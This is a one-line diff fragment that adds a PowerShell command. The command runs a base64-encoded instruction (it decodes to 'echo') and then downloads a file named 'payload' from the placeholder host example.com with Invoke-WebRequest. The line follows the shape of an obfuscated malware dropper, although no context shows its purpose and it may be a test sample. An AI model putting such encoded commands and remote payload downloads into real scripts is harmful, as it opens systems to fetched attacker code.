@@ -1,0 +1,1 @@
+powershell -enc ZQBjAGgAbwA= ; Invoke-WebRequest http://example.com/payload
